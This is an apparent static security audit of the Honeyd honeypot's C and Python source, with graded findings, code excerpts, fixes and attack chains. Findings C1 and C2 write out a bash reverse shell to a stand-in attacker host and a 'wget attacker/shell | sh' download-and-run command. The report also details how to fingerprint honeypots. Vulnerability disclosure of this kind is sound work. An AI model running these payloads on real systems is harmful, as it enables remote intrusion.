# Honeyd — Security Analysis
**Target:** https://github.com/DataSoft/Honeyd  
**Date:** 2026-08-25  
**Status:** Complete (5 lanes)  
**Language:** C + Python (embedded via libpython)  
**Method:** Static source analysis — memory safety, command injection/privilege, packet parsing/DoS, detection fingerprints/logging, web server/plugins/stats

---

## Severity Summary

| Sev | Count |
|-----|-------|
| CRITICAL | 8 |
| HIGH | 22 |
| MEDIUM | 14 |
| LOW | 9 |

---

## CRITICAL Findings

---

### C1 — Unauthenticated Python Eval via UNIX Socket
**Files:** `ui.c:84,163-173`, `pyextend.c:815-903`

```c
// ui.c:163-173
int ui_command_python(struct evbuffer *buf, char *line) {
    pyextend_run(buf, line);
    return (0);
}
```

```c
// pyextend.c:888
res = PyEval_EvalCode((PyCodeObject *)compiled_code,
    pyextend_dict_global, pyextend_dict_local);
```

UNIX domain socket exposes a `!` command that compiles and evaluates arbitrary Python via `Py_CompileStringFlags` + `PyEval_EvalCode`. Zero authentication. Socket mode not restricted to root. Any local process with socket access gets RCE at honeyd's UID. Global dict `pyextend_dict_global` is persistent — state accumulates across calls, enabling a persistent foothold.

**Exploit:** Connect to socket, send `! import os; os.system("bash -i >&/dev/tcp/attacker/4444 0>&1")`

**Fix:** Set socket permissions `0600` root-only, or add `SO_PEERCRED` UID gating.

---

### C2 — Unauthenticated Config Parser → Arbitrary fork/exec
**Files:** `ui.c:222-228`, `parse.y:258-273`

```c
// ui.c:225-228 — unrecognized commands fall through with zero access control
if (line != NULL)
    original[strlen(command)] = ' ';
parse_line(buf, original);
```

Unknown socket commands are passed directly to the live config parser. `add <template> subsystem "<cmd>"` immediately forks and execs the specified binary as a subsystem process. Any local user on the socket reconfigures honeyd at runtime and spawns arbitrary processes.

**Exploit:** Send `add mytemplate subsystem "/bin/sh -c 'wget attacker/shell | sh'"` — spawned immediately as honeyd's UID.

**Fix:** Authenticate socket. Apply `SO_PEERCRED`, accept only root or operator UID.

---

### C3 — Web Server: Zero Authentication
**File:** `webserver/server.py:32-33`

```python
def verify_request(self, request, client_address):
    return 1   # hardcoded accept-all
```

Full admin UI exposed to any reachable client. No IP filtering, no session, no credentials anywhere in the stack.

**Fix:** Bind to `127.0.0.1` only, or add HTTP Basic auth + IP allowlist.

---

### C4 — Web Server: execfile() on Any .py Under Webroot
**File:** `webserver/server.py:135`

```python
execfile(scriptname)
```

Every `.py` file under the webroot is executed in-process with full access to the `honeyd` C extension module (`delete_template`, `delete_connection`, `status_connections`, `config`, `raw_log`, etc.). No sandboxing. URL maps to filesystem path. File drop anywhere under webroot = process-level RCE as honeyd user. Combined with the writable `graphs/` and `templates/` directories under webroot (explicitly made W_OK in `pyextend.c:1366-1371`).

**Fix:** Replace `execfile` with a whitelisted script registry. Do not execute scripts by path derived from URL.

---

### C5 — u_short Integer Overflow in IP Fragment Offset
**File:** `ipfrag.c:370-386`

```c
u_short off;
off = ntohs(ip->ip_off);
off &= IP_OFFMASK;   // max 0x1FFF = 8191
off <<= 3;           // max 65528 — fits u_short
...
hlen = ip->ip_hl << 2;   // max ip_hl=15 → hlen=60
off += hlen;         // OVERFLOW: 65528 + 60 = 65588 → wraps to 52
if (off + len > IP_LEN_MAX || len == 0)   // bounds check against wrapped value
    goto freeall;
```

Fragment inserted at offset 52 instead of ~65500. Poisons reassembly queue for that flow. Subsequent fragments evaluated for overlap against wrong position — permanently broken reassembly. Remote DoS, zero auth required.

**Fix:** Use `uint32_t` for intermediate offset calculations; check before narrowing to `u_short`.

---

### C6 — TCP Window Size Hardcoded to 16000 (Definitive Fingerprint)
**File:** `honeyd.c:1527`

```c
int window = 16000;
```

No real OS uses 16000 as TCP window on SYN-ACK. Windows: 8192/65535, Linux: 14600/29200, BSD: 65535. Any scanner doing window correlation identifies Honeyd instantly on first SYN-ACK.

---

### C7 — TCP Timestamp Echo Disabled (Definitive Fingerprint)
**File:** `personality.c:898-900`

```c
/*if (con->sawtimestamp)
    opt.opt_data.timestamp[1] = con->echotimestamp;*/
```

Commented out. RFC 1323 mandates TSecr echo the sender's TSval. Honeyd sends 0 or its own counter, never the client's TSval. Nmap T5-T7 tests detect this immediately. Any RFC-aware tool identifies Honeyd from the first handshake.

---

### C8 — Fork Latency + Correlated Multi-Host Timing (Definitive Detection)
**File:** `honeyd.c:1502`

```c
if (cmd_fork(hdr, cmd, tmpl, argv[0], argv, con) == -1) {
```

**Fork latency:** Called after 3-way handshake. Fork+exec for a shell script: 5-30ms. Real server data response: <1ms. `time echo "" | nc -w1 <honeyd_ip> 80` — unmistakable bimodal latency. SYN-ACK fast; first data response slow.

**Correlated multi-host RTT:** Single Honeyd process handles all virtual IPs. Parallel `nmap -T5 10.0.0.0/24` sees all 254 hosts respond within the same OS scheduler quantum. Real networks show uncorrelated inter-host RTT. Honeyd shows near-zero inter-host variance — statistically impossible on real hardware.

---

## HIGH Findings

---

### H1 — double Off-by-One Heap Overflow in determine_path
**File:** `honeyd.c:1069-1074`

```c
buffer = malloc(strlen(abspath) + strlen(*input));   // missing +2 for '/' and '\0'
strcpy(buffer, abspath);
strcat(buffer, "/");       // 1 byte past end
strcat(buffer, *input);    // null terminator past end

*input = (char *) malloc(strlen(buffer));   // missing +1 for '\0'
strcpy(*input, buffer);    // null terminator past end again
```

Two sequential one-byte heap overflows. Triggered by any relative path argument (`-f`, `-l`, `-s`, `-t`, `-x`, `-a`, `-0`, `-m`). Heap metadata corruption; on systems without canaries, exploitable for RCE if honeyd runs setuid or via privileged wrapper.

**Fix:** `malloc(strlen(abspath) + strlen(*input) + 2)` and `malloc(strlen(buffer) + 1)`.

---

### H2 — Integer Overflow Before malloc in Subsystem recvmsg/sendmsg
**File:** `honeyd_overload.c:870-876, 928-934`

```c
size_t len = 0;
for (i = 0; i < msg->msg_iovlen; i++) {
    len += msg->msg_iov[i].iov_len;   // no overflow check
}
if ((data = malloc(len)) == NULL) { ... }   // len may have wrapped to 0
// memcpy loop then copies actual (large) total into too-small buffer
```

Subsystem socket interceptor. `iov_len` sum overflows `size_t` → `malloc(0)` → valid non-NULL pointer → heap overflow in subsequent memcpy. Any subsystem receiving crafted network data can trigger this. `sendmsg` has identical issue.

**Fix:** Check `len > SIZE_MAX - iov[i].iov_len` before each accumulation.

---

### H3 — Stack Buffer Overflow in nmap-mac-prefixes Vendor Name Parsing
**File:** `ethernet.c:183-212`

```c
char routerCompany[80];   // 80-byte stack buffer
for(j = 0; j < 300; j++){   // line up to 300 chars, no guard on j - companyNameStart
    routerCompany[j-companyNameStart] = currentChar;   // index can reach 299
```

Vendor name > 79 chars overflows the 80-byte stack buffer. `j` runs to 300 with no guard. Triggered by a crafted `nmap-mac-prefixes` file. On systems without stack canaries → RCE.

**Fix:** Add `if (j - companyNameStart >= sizeof(routerCompany) - 1) break;`

---

### H4 — Dangling Vendor Pointer After ethernetcode_init
**File:** `ethernet.c:216`

```c
do {
    char routerCompany[80];   // automatic storage, same address each iteration
    ...
    currentCode->vendor = routerCompany;   // stores pointer to stack local
    ethernetcode_index(&etherroot, currentCode);
} while (fgets(...));
```

All `codes[n]->vendor` point to the same stack address, valid only during the loop iteration. Any post-return dereference of `vendor` is undefined behavior — crash or information leak.

---

### H5 — Out-of-Bounds Read in parse_option 'T' Case
**File:** `personality.c:1940-1942`

```c
case 'T':
    options->options[i].TSval = *(line+1);   // no null check
    options->options[i].TSecr = *(line+2);   // no null check
    line += 3;
```

Options string ending with `T` reads past the null terminator. Triggered by malformed nmap OS fingerprint file. OOB read leaks adjacent heap bytes into TCP option struct.

**Fix:** Check `*(line+1) != '\0' && *(line+2) != '\0'` before reading.

---

### H6 — Python Module Search Path Contains CWD and Writable Webroot
**File:** `pyextend.c:779-798`

```c
strlcat(path, ":.", sizeof(path));          // CWD in sys.path
strlcat(path, ":webserver", sizeof(path)); // relative path in sys.path
// webserver/graphs/ and webserver/templates/ explicitly made W_OK
```

CWD `.` and relative `webserver` path prepended to Python `sys.path`. Writable `graphs/` and `templates/` dirs are under the webroot. Write a `<module>.py` to either → imported and executed as privileged code when honeyd loads a Python service.

**Fix:** Do not include `.` or relative paths in `sys.path`. Separate write dirs from import paths.

---

### H7 — Log Injection via Service Script Output
**File:** `log.c:274-303`

```c
fprintf(fp, "%s %s %s: |%s|\n", honeyd_logtime(), honeyd_logproto(proto),
    honeyd_logtuple(hdr), myline);
```

`myline` from service script stderr — which may echo attacker input. The do-while splits on `\n`, creating new log lines per newline in attacker payload. Attacker sending `\nHoneyd stopped ------` forges log entries with fresh timestamps. SIEM parsers triggered on these patterns produce false events.

---

### H8 — Webserver Slow-Read DoS (No Connection Timeout)
**File:** `pyextend.c:1126-1176`

```c
if (evbuffer_find(bev->input, "\r\n\r\n", 4) == NULL) {
    if (evbuffer_get_length(bev->input) > PYEXTEND_MAX_REQUEST_SIZE) {
        // drops only if > max size
    }
    return;   // no timer set — slow client held open indefinitely
}
```

No timeout on partial HTTP requests. Client sending data slowly without completing `\r\n\r\n` holds connection open indefinitely. Many concurrent slow clients exhaust file descriptors.

---

### H9 — Webserver: Directory Listing Enabled
**File:** `webserver/server.py:69-76`

```python
else:
    return self.list_directory(path)
```

Any directory without `index.html`/`index.htm` gets full directory listing via Python's `SimpleHTTPServer.list_directory`. Note: `index.py` does not suppress listing. Unauthenticated.

---

### H10 — CSRF on Destructive Operations
**File:** `webserver/support.py:17-33`

```python
if query.has_key('delete_connection'):
    arguments = urllib.unquote(query['delete_connection']).split(',')
    honeyd.delete_connection(*arguments)
```

Template deletion and connection termination triggered by GET params. No CSRF token, no referrer check. `<img src="honeyd:port/config.py?delete_connection=tcp,1.2.3.4,80,5.6.7.8,443">` terminates connections when any admin loads the page.

---

### H11 — Reflected XSS in Config/Interface Output
**File:** `webserver/support.py:70-74, 143-146`

```python
content += '<td>%s</td><td>%s</td>' % (name, config[name])
```

Config keys/values (personality strings, filesystem paths) and interface names inserted into HTML without escaping. `cgi.escape()` helper exists (`support.py:7`) but not applied to these paths. Stored XSS if config values contain `<script>`.

---

### H12 — ISN/TTL/ISR Always at Exact Midpoint of Range
**File:** `personality.c:1052, 1126, 1162, 1553`

```c
pers->TCP_ISN_gcd = ((gcd_max - gcd_min)/2) + gcd_min;  // always midpoint
pers->TCP_SP      = ((SP_max - SP_min)/2) + SP_min;
pers->TCP_ISR     = ((ISR_max - ISR_min)/2) + ISR_min;
test->ttl         = (ttl_max + ttl_min) / 2;
```

Every range-valued nmap-os-db field collapses to exact midpoint. Real OS stacks draw from distributions. 6 SYN probes returning values always at exact midpoints across every field is statistically impossible on real hardware.

---

### H13 — `rand()` (Not CSPRNG) for ISN Entropy
**File:** `personality.c:498-499`

```c
x = 2.0*rand()/RAND_MAX - 1;   // C stdlib rand(), not honeyd_rand PRNG
```

15-bit effective entropy vs 32-bit kernel entropy. Nmap's TCP SP (sequence predictability) test will show non-cryptographic periodicity. Statistical ISN analysis recovers the seed.

---

### H14 — ICMP Timestamp Reply Fields Wrong
**File:** `honeyd.c:1892-1894`

```c
icmp_time.icmp_ts_rx = icmp_rip->icmp_ts_orig + milliseconds;
icmp_time.icmp_ts_tx = icmp_rip->icmp_ts_rx;  // copies from REQUEST's rx field (= 0)
```

`icmp_ts_tx` should be close to `icmp_ts_rx` (microseconds apart). Honeyd produces `icmp_ts_tx = 0` while `icmp_ts_rx` is non-zero — impossible clock-backward artifact. `hping3 --icmp-ts` exposes both bugs.

---

### H15 — Filtered Ports Leave Zero Log Entries
**File:** `honeyd.c:1274-1291`

`honeyd_block()` returns true → packet silently dropped. No log entry written. Full 65535-port scan against a Honeyd host with `action filtered` produces zero log records. Attacker maps the network with no trace.

---

### H16 — ICMP Reconnaissance Not in File Log
**File:** `log.c` (absence)

`honeyd_log_flownew`/`honeyd_log_flowend` called only from `tcp_new`/`tcp_free` and `udp_new`/`udp_free`. ICMP has no equivalent. Echo requests, timestamp requests, mask requests — LOG_DEBUG only, off by default. ICMP reconnaissance leaves no file-based log.

---

### H17 — Payload Content Never Logged
**File:** `log.c:313`

```c
fprintf(fp, "%s %s - %s: %d%s%s\n", ..., size, tcpflags, comment);
```

Size and flags only. Actual payload bytes never captured unless a service script explicitly logs them. Standard Honeyd deployment is blind to exploit payloads, credentials, and commands.

---

### H18 — Many Virtual IPs Share Physical Interface MAC
**File:** `arp.c:405-406`

```c
if (tmpl == NULL || tmpl->ethernet_addr == NULL)
    reply_sha = &inter->if_ent.intf_link_addr;
```

Templates without explicit ethernet addresses ARP-reply with the physical interface MAC. A /24 with 200 virtual hosts, most without `set X ethernet "..."`, produces dozens of ARP replies claiming the same MAC. `arpwatch` on the segment triggers immediately.

---

### H19 — No Gratuitous ARP
**File:** `arp.c` (absence)

Honeyd never emits ARP announcements. Real hosts send GARP on link-up, IP configuration, IP conflict detection. Passive ARP monitoring never sees Honeyd self-announce. Every Honeyd virtual host is absent from normal ARP traffic.

---

### H20 — Silent Connection Drop at Max Connections (No RST)
**File:** `honeyd.c:1084-1092`

```c
if (honeyd_nconnects >= HONEYD_MAX_CONNECTS) {
    con = (struct tcp_con *)TAILQ_LAST(&tcplru, conlru);
    tcp_free(con);   // no RST, no FIN
}
```

At 32,000 connections, oldest silently freed. Remote end sees half-open that never terminates. Real OS stacks send RST on resource exhaustion. Attacker holding 32,000 half-open connections triggers this and observes abrupt silent termination — unambiguous honeypot indicator.

---

### H21 — Open Port with No Service = Eternal Silent Accept
**File:** `honeyd.c:1440-1443`

Port configured `open` with no service action: 3-way handshake completes, then nothing. Connection held 300s (idle timeout). Real services always send data or close. An eternal-accept-with-no-data port is a definitive Honeyd signature.

---

### H22 — Webserver Exposes Traffic Stats/Graphs
**File:** `honeyd.c:175-176`

If deployed with `--webserver-address=0.0.0.0`, Python webserver serves traffic graphs (hourly/daily GIFs), uptime, and status. Reveals: aggregate honeypot traffic volume, deployment uptime, absence of real application content.

---

## MEDIUM Findings

---

### M1 — Out-of-Bounds Write in parse_win 'N' Case
**File:** `personality.c:1991-2009`

```c
if(*p2 == 'N') {
    pers->seq_tests[i].window = 0; i++;   // up to 6 increments
    pers->seq_tests[i].window = 0; i++;   // seq_tests has 6 elements (0-5)
    ...                                    // if i starts at 1, writes seq_tests[6]
```

`N` branch increments `i` 6 times unconditionally. If `i > 0` when entered, writes to `seq_tests[6]` — past the 6-element array, into adjacent struct memory. Triggered by malformed nmap-os-db WIN line.

---

### M2 — tcp_personality_options: No Output Buffer Bounds Check
**File:** `personality.c:840-926`

`SET()` macro increments pointer `p` per TCP option added. No check that total `optlen <= 40` (TCP options cap). Pathological personality options string overwrites past TCP header into payload space.

---

### M3 — ARP Process Exit on Unexpected Address Type
**File:** `arp.c:236-246`

```c
} else {
    syslog(LOG_ERR, "%s: lookup for unsupported address type", __func__);
    exit(EXIT_FAILURE);    // terminates entire honeyd process
```

Unexpected `addr_type` from a crafted ARP packet → entire daemon terminates. Remote DoS.

---

### M4 — Fragment Reclaim No-Op Below 10 Fragments
**File:** `ipfrag.c:191-200`

```c
if (nfragmem > IPFRAG_MAX_MEM || nfragments > IPFRAG_MAX_FRAGS)
    ip_fragment_reclaim(nfragments/10);   // integer division: < 10 → reclaim(0)
```

9 large fragments exhausting `IPFRAG_MAX_MEM` → reclaim called with 0 → no eviction → all new fragment flows drop silently until 10-second timeout.

---

### M5 — rrdtool Newline Injection
**File:** `rrdtool.c:457-458`

```c
snprintf(line, sizeof(line), "graph %s --start %ld --end %ld %s",
    filename, tv_start->tv_sec, tv_end->tv_sec, spec);
```

`spec` passed verbatim into rrdtool pipe-mode command string. Embedded `\n` injects a second rrdtool command (`create`, `restore`, etc.) changing on-disk state.

---

### M6 — syslog Injection via $ipsrc Variable Expansion
**File:** `honeyd.c:1507-1509`

```c
syslog(LOG_DEBUG, "Connection established: %s %s <-> %s", ..., command);
```

`command` contains `$ipsrc` (attacker source IP). Crafted source IP: `10.0.0.1 Connection established: tcp 10.0.0.1 1234 10.0.0.2 80` → syslog entry mimics a legitimate connection record.

---

### M7 — HONEYD_REMOTE_OS Env Var from Fingerprint DB Unescaped
**File:** `command.c:233-236`

```c
os_name = honeyd_osfp_name(&ip);
if (os_name != NULL)
    setenv("HONEYD_REMOTE_OS", os_name, 1);
```

nmap-os-db personality name set as env var, inherited by all forked scripts. If `os_name` contains shell metacharacters and any service script passes `$HONEYD_REMOTE_OS` to a shell construct, second-order command injection.

---

### M8 — Missing Py_DECREF on CallObject Return Value (Heap Leak)
**File:** `pyextend.c:1100-1103`

```c
PyObject_CallObject(pye->pFuncEnd, pArgs);   // return value discarded
Py_DECREF(pArgs);
```

Return value new reference never `Py_DECREF`'d. Under high connection churn: Python heap grows unboundedly.

---

### M9 — Memory Leak in pyextend_load_module Error Path
**File:** `pyextend.c:951-974`

`pye = calloc(...)` before `CHECK_FUNC` calls. Error label at line 974: `Py_DECREF(pModule); return NULL`. `free(pye)` absent. If any `CHECK_FUNC` fails, `pye` leaks.

---

### M10 — UDP Hook Fires with TCP Protocol Code
**File:** `honeyd.c:1218`

```c
hooks_dispatch(IP_PROTO_TCP, HD_INCOMING_STREAM, &con->conhdr, NULL, 0);
```

Inside `udp_free`. Hooks registered for `IP_PROTO_UDP` stream-end events never fire — protocol mismatch. UDP connection tracking events unreliable.

---

### M11 — Silent Log Failure on File Error
**File:** `log.c:306-312`

```c
void honeyd_log_probe(FILE *fp, ...) {
    if (fp == NULL)
        return;
```

Log file failure → `honeyd_logfp = NULL` → all logging silently stops, no per-probe warning. Attacker who fills disk disables logging.

---

### M12 — Binary Retransmit Backoff (Not RFC 6298)
**File:** `honeyd.c:1150-1153`

```c
con->retrans_time *= 2;
if (con->retrans_time >= 60) tcp_free(con);
```

Fixed binary doubling from 1s with hard 60s cap. RFC 6298 mandates RTTVAR-based RTO. Artificial RTT manipulation exposes the fixed pattern.

---

### M13 — droppriv Logs Wrong UID on OpenBSD
**File:** `command.c:299-303`

```c
SETERROR((errline, sizeof(errline), "%s: seteuid(%d) failed\n", __func__, gid));  // gid not uid
```

Error message reports `gid` instead of `uid` on seteuid failure. Incident analysis investigates wrong account.

---

### M14 — Missing warn() Argument → Crash Under Heap Pressure
**File:** `pydataprocessing.c:96, 102, 149, 154`

```c
warn("%s: calloc");   // %s has no argument — reads garbage from stack as char*
```

`warn()` dereferences the garbage pointer → SIGSEGV under any heap pressure during `MergedKeyValueNew` or `MergedKeyValueInsert`. Process crash.

**Fix:** `warn("%s: calloc", __func__);` (all four calls).

---

## LOW Findings

---

### L1 — No Per-Source-IP Fragment Queue Limit
`ipfrag.c` — `nfragments`/`nfragmem` global with no per-IP quota. Single attacker IP consumes entire `IPFRAG_MAX_FRAGS` budget, starving all other sources. Only eviction: 10-second `IPFRAG_TIMEOUT`.

---

### L2 — Fragment Reassembly Loop No Write Pointer Bounds
**File:** `ipfrag.c:312-322`

```c
for(ent = ...) {
    memcpy(data, ent->data, ent->len);
    data += ent->len;   // no check on data - buf < IP_LEN_MAX
}
```

If fragment lengths sum > 65535 bytes (possible with C5 queue poisoning), writes past static 65535-byte `buf`.

---

### L3 — ARP Discover Sends 2 Probes vs 3+ (RFC 5227)
**File:** `arp.c:209-218`

Exactly 2 ARP probes at 500ms spacing when forwarding to real hosts. RFC 5227 mandates 3+. Detectable when Honeyd acts as a router.

---

### L4 — ip_hl Not Lower-Bounded in osfp_match
**File:** `osfp.c:204`

```c
tcp = (const struct tcp_hdr *)((u_char *)ip + (ip->ip_hl << 2));
```

`ip_hl = 0` → `ip` and `tcp` alias same memory. Type confusion in fingerprint calculation.

---

### L5 — Silent Payload Truncation in tcp_add_readbuf
**File:** `tcp.c:119-124`

```c
if (space < datlen)
    datlen = space;   // truncation — no error return
memcpy(con->readbuf + con->rlen, dat, datlen);
```

Caller receives success with fewer bytes accepted than sent. No error signaled.

---

### L6 — routerID[20] Not Null-Terminated on No-Space Line
**File:** `ethernet.c:183-191`

Malformed MAC prefix line with no space within 20 chars → `sscanf` on non-terminated buffer → undefined behavior.

---

### L7 — rrdtool Graph Path Not Normalized
**File:** `honeyd.c:407-429`

`honeyd_webserver_root` passed to rrdtool command string without quoting. Spaces or special chars in operator-supplied path corrupt the rrdtool command.

---

### L8 — /tmp/honeyd_traffic.rrd Hardcoded Path
**File:** `honeyd.c:436`

Predictable path in `/tmp`. Existence + mtime confirms Honeyd deployment. RRD data shows aggregate traffic patterns.

---

### L9 — sizeof(struct traceq*) Should Be sizeof(struct traceq)
**File:** `util.c:624`

```c
struct traceq *head = malloc(sizeof(struct traceq *));  // 8 bytes on 64-bit
TAILQ_INIT(head);   // writes 16-byte struct — 8 bytes past allocation
```

Currently dead code (`trace_on` defaults to 0, `trace_onoff()` never called). If tracing is activated in future builds: immediate heap overflow on every new connection.

---

## Detection Fingerprint Summary

Honeyd is identifiable with one or two probes before any authentication:

| Signal | Method | Confidence |
|--------|--------|------------|
| TCP window = 16000 on SYN-ACK | Passive capture | ~100% |
| TSecr = 0 (never echoes TSval) | Capture or nmap T5-T7 | ~100% |
| ISN/SP/ISR/TTL at exact range midpoint | nmap -O | ~100% |
| Fork latency: SYN-ACK fast, first data 5-30ms | hping3 timing | ~99% |
| Multi-host correlated RTT clustering | Parallel scan RTT variance | ~99% |
| Many virtual IPs same ARP MAC | arpwatch / passive ARP | ~100% |
| No gratuitous ARP ever | Passive ARP monitoring | ~80% |
| 2 ARP probes at 500ms (vs 3+ RFC 5227) | Trigger gateway forward | ~90% |
| `icmp_ts_tx = 0` while `icmp_ts_rx > 0` | hping3 --icmp-ts | ~100% |
| ICMP_IP_ID > 32768, TCP_IP_ID < 1024 | Interleaved ICMP+TCP probe | ~95% |

**Minimum fingerprint:** TCP window 16000 (passive, one packet) + TSecr = 0 (one handshake) = definitive ID before any payload exchange.

---

## Attack Chains

**Chain 1 — Local → RCE (no auth):**
Connect to UNIX management socket → send `! import os; os.system("...")` → immediate RCE at honeyd UID. Alternatively, send config directive `add mytemplate subsystem "/bin/sh -c '...'"` through the config parser fallback path.

**Chain 2 — Remote → RCE via webroot write:**
Exploit any web-reachable write primitive (writable `graphs/` directory) → drop `evil.py` → request `http://honeyd/evil.py` → `execfile()` runs as honeyd process → RCE.

**Chain 3 — Remote DoS via fragment queue exhaustion:**
Craft fragments with `ip_off = IP_OFFMASK | MF`, `ip_hl = 15` → offset wraps to 52 → queue permanently poisoned for that flow. Spray across multiple src/dst/id combos → exhaust `IPFRAG_MAX_FRAGS` → all new fragment flows drop silently.

**Chain 4 — Passive detection (zero interaction):**
Capture ARP traffic on segment → many IPs same MAC = Honeyd. Capture TCP SYN-ACK → window = 16000 = Honeyd. Zero active probing required.
